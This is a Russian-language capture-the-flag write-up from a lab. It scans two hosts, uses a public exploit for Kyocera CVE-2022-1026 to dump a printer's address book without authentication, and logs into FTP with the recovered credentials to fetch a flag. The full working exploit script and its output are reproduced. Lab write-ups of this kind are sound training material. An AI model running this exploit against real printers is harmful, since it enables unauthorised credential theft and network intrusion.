Сканируем хосты
```bash
┌──(kali㉿kaliOlymp)-[~]
└─$ nmap -v 10.10.1.72 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 15:56 MSK
Initiating Ping Scan at 15:56
Scanning 10.10.1.72 [4 ports]
Completed Ping Scan at 15:56, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:57
Completed Parallel DNS resolution of 1 host. at 15:57, 0.01s elapsed
Initiating SYN Stealth Scan at 15:57
Scanning 10.10.1.72 [1000 ports]
Discovered open port 80/tcp on 10.10.1.72
Discovered open port 9091/tcp on 10.10.1.72
Completed SYN Stealth Scan at 15:57, 6.75s elapsed (1000 total ports)
Nmap scan report for 10.10.1.72
Host is up (0.044s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
           Raw packets sent: 2005 (88.196KB) | Rcvd: 6 (248B)
                                                                                                                                                                                                                                           
┌──(kali㉿kaliOlymp)-[~]
└─$ nmap -v 10.10.1.110
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 15:57 MSK
Initiating Ping Scan at 15:57
Scanning 10.10.1.110 [4 ports]
Completed Ping Scan at 15:57, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:57
Completed Parallel DNS resolution of 1 host. at 15:57, 0.01s elapsed
Initiating SYN Stealth Scan at 15:57
Scanning 10.10.1.110 [1000 ports]
Discovered open port 21/tcp on 10.10.1.110
Completed SYN Stealth Scan at 15:57, 4.75s elapsed (1000 total ports)
Nmap scan report for 10.10.1.110
Host is up (0.0012s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
10180/tcp closed unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.90 seconds
           Raw packets sent: 2004 (88.152KB) | Rcvd: 5 (200B)
               
```
открытые порты
```bash
10.10.1.72
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

10.10.1.110
21/tcp    open   ftp
10180/tcp closed unknown
```
Заходим на 10.10.1.72:80, ищем "command center rx exploit"
Находим cve https://github.com/ac3lives/kyocera-cve-2022-1026
и юзаем его
```bash
┌──(kali㉿kaliOlymp)-[~/.sols/printer1]
└─$ python3 getKyoceraCreds.py 10.10.1.72           
Obtained address book object: 7. Waiting for book to populate
Submitting request to retrieve the address book object...
{'@xml:space': 'preserve', 'kmaddrbook:get_personal_address_listResponse': {'kmaddrbook:result': 'ALL_GET_COMPLETE', 'kmaddrbook:personal_address': [{'kmaddrbook:name_information': {'kmaddrbook:name': 'Даниил Савин', 'kmaddrbook:furigana': 'Даниил Савин', 'kmaddrbook:id': '1'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '44'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'Немихаил Непетрачков', 'kmaddrbook:furigana': 'Немихаил Непетрачков', 'kmaddrbook:id': '2'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '445'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'Константин Костеневский', 'kmaddrbook:furigana': 'Константин Костеневский', 'kmaddrbook:id': '3'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '44'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'Валентина Споржедичко', 'kmaddrbook:furigana': 'Валентина Споржедичко', 'kmaddrbook:id': '4'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21', 'kmaddrbook:login_name': 'ftpuser', 'kmaddrbook:login_password': 'r34llyh4rdp455'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '445'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'Вера Джейсонина', 'kmaddrbook:furigana': 'Вера Джейсонина', 'kmaddrbook:id': '5'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '445'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'Александр Ивлев', 'kmaddrbook:furigana': 'Александр Ивлев', 'kmaddrbook:id': '6'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '44'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'Александр Анчишкин', 'kmaddrbook:furigana': 'Александр Анчишкин', 'kmaddrbook:id': '7'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '445'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}, {'kmaddrbook:name_information': {'kmaddrbook:name': 'tset', 'kmaddrbook:furigana': 'tset', 'kmaddrbook:id': '8'}, 'kmaddrbook:email_information': {'kmaddrbook:address': None}, 'kmaddrbook:ftp_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '21'}, 'kmaddrbook:smb_information': {'kmaddrbook:server_name': None, 'kmaddrbook:port_number': '445'}, 'kmaddrbook:fax_information': {'kmaddrbook:fax_number': None, 'kmaddrbook:connection_begining_speed': '33600', 'kmaddrbook:ecm': 'ON', 'kmaddrbook:code_key_id': '0', 'kmaddrbook:code_send_setting': 'OFF', 'kmaddrbook:code_box_number': '0', 'kmaddrbook:code_box_setting': 'OFF'}}]}}


Obtained address book. Review the above response for credentials in objects such as 'login_password', 'login_name'
```
В ответе видим креды от ftp
```js
"kmaddrbook:login_name": "ftpuser",
"kmaddrbook:login_password": "r34llyh4rdp455",
```
Заходим и скачиваем флаг
```bash
┌──(kali㉿kaliOlymp)-[~]
└─$ ftp 10.10.1.110
Connected to 10.10.1.110.
220 (vsFTPd 3.0.5)
Name (10.10.1.110:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10143|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              29 Mar 15 14:27 NTOflag1.txt
-rw-rw-r--    1 0        0           61855 Mar 07 21:43 redis.conf
226 Directory send OK.
ftp> get NTOflag1.txt
local: NTOflag1.txt remote: NTOflag1.txt
229 Entering Extended Passive Mode (|||10186|)
150 Opening BINARY mode data connection for NTOflag1.txt (29 bytes).
100% |**********************************************************************************************************************************************************************************************|    29      211.34 KiB/s    00:00 ETA
226 Transfer complete.
29 bytes received in 00:00 (20.77 KiB/s)
```
Смотрим флаг
```bash
┌──(kali㉿kaliOlymp)-[~]
└─$ cat NTOflag1.txt  
nto{f7p_4cc355_fr0m_ky0c3r4}
```
```python
"""
Kyocera printer exploit
Extracts sensitive data stored in the printer address book, unauthenticated, including:
    *email addresses
    *SMB file share credentials used to write scan jobs to a network fileshare
    *FTP credentials
 
Author: Aaron Herndon, @ac3lives (Rapid7)
Date: 11/12/2021
Tested versions: 
    * ECOSYS M2640idw
    *  TASKalfa 406ci
    * 
 
Usage: 
python3 getKyoceraCreds.py printerip
"""
 
import requests
import xmltodict
import warnings
import sys
import time
warnings.filterwarnings("ignore")
 
url = "https://{}:9091/ws/km-wsdl/setting/address_book".format(sys.argv[1])
headers = {'content-type': 'application/soap+xml'}
# Submit an unauthenticated request to tell the printer that a new address book object creation is required
body = """<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"""
 
response = requests.post(url,data=body,headers=headers, verify=False)
strResponse = response.content.decode('utf-8')
#print(strResponse)
 
 
parsed = xmltodict.parse(strResponse)
# The SOAP request returns XML with an object ID as an integer stored in kmaddrbook:enumeration. We need this object ID to request the data from the printer.
getNumber = parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body']['kmaddrbook:create_personal_address_enumerationResponse']['kmaddrbook:enumeration']
 
body = """<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>""".format(getNumber)
 
print("Obtained address book object: {}. Waiting for book to populate".format(getNumber))
time.sleep(5)
print("Submitting request to retrieve the address book object...")
 
 
response = requests.post(url,data=body,headers=headers, verify=False)
strResponse = response.content.decode('utf-8')
#rint(strResponse)
 
parsed = xmltodict.parse(strResponse)
print(parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body'])
 
print("\n\nObtained address book. Review the above response for credentials in objects such as 'login_password', 'login_name'")
```

```python
{
    "@xml:space": "preserve",
    "kmaddrbook:get_personal_address_listResponse": {
        "kmaddrbook:result": "ALL_GET_COMPLETE",
        "kmaddrbook:personal_address": [
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Даниил Савин",
                    "kmaddrbook:furigana": "Даниил Савин",
                    "kmaddrbook:id": "1",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "44",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Немихаил Непетрачков",
                    "kmaddrbook:furigana": "Немихаил Непетрачков",
                    "kmaddrbook:id": "2",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "445",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Константин Костеневский",
                    "kmaddrbook:furigana": "Константин Костеневский",
                    "kmaddrbook:id": "3",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "44",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Валентина Споржедичко",
                    "kmaddrbook:furigana": "Валентина Споржедичко",
                    "kmaddrbook:id": "4",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                    "kmaddrbook:login_name": "ftpuser",
                    "kmaddrbook:login_password": "r34llyh4rdp455",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "445",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Вера Джейсонина",
                    "kmaddrbook:furigana": "Вера Джейсонина",
                    "kmaddrbook:id": "5",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "445",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Александр Ивлев",
                    "kmaddrbook:furigana": "Александр Ивлев",
                    "kmaddrbook:id": "6",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "44",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
            {
                "kmaddrbook:name_information": {
                    "kmaddrbook:name": "Александр Анчишкин",
                    "kmaddrbook:furigana": "Александр Анчишкин",
                    "kmaddrbook:id": "7",
                },
                "kmaddrbook:email_information": {"kmaddrbook:address": None},
                "kmaddrbook:ftp_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "21",
                },
                "kmaddrbook:smb_information": {
                    "kmaddrbook:server_name": None,
                    "kmaddrbook:port_number": "445",
                },
                "kmaddrbook:fax_information": {
                    "kmaddrbook:fax_number": None,
                    "kmaddrbook:connection_begining_speed": "33600",
                    "kmaddrbook:ecm": "ON",
                    "kmaddrbook:code_key_id": "0",
                    "kmaddrbook:code_send_setting": "OFF",
                    "kmaddrbook:code_box_number": "0",
                    "kmaddrbook:code_box_setting": "OFF",
                },
            },
        ],
    },
}
```
